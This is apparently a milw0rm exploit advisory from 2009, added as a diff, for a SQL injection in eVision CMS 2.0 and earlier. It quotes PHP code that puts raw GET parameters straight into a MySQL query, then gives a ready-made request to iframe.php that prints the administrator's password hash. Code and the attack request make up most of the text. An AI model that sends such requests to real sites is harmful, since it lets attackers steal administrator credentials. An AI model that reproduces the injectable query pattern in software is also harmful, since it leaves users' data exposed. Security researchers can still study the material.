@@ -1,0 +1,35 @@
+--+++============================================================+++--
+--+++====== eVision CMS <= 2.0 SQL Injection Vulnerability ======+++--
+--+++============================================================+++--
+
+[+] Author  : darkjoker
+[+] Site    : http://darkjoker.net23.net
+[+] Download: http://kent.dl.sourceforge.net/sourceforge/e-vision/eVision-2.0.tar.gz
+
+[+] Vulnerable code:
+
+    67  $sql = "SELECT `".$_GET['field']."` FROM ".$_GET['module']." WHERE `id".$_GET['module']."`='".$_GET['id']."'";
+    68  $result = mysql_query($sql);
+    69  $row = mysql_fetch_array($result);
+    70
+    71  if ( isset($_GET['div']) ) { $div = 'class="'.$_GET['div'].'"'; }
+    72  else { $div = ''; }
+    73  if ( isset($_GET['font']) ) { $font = 'class="'.$_GET['font'].'"'; }
+    74  else { $font = ''; }
+    75
+    76  echo '
+    77  <html '.$div.'>
+    78  <head>
+    79          <meta http-equiv="Content-Type" content="text/html; charset='.$charset.'">
+    80          <link rel="stylesheet" type="text/css" href="'.$path.'style.php?template='.$template.'&module='.$_GET['module'].'">
+    81  </head>
+    82  <body marginwidth="0" marginheight="0" topmargin="0" leftmargin="0" '.$font.'>'.set_text($row[$_GET['field']]).'</body>
+    83  </html>
+    84  ';
+
+
+[+] It prints admin's password (hashed):
+
+[+] /iframe.php?field=pass&module=users&id=1
+
+# milw0rm.com [2009-01-30]
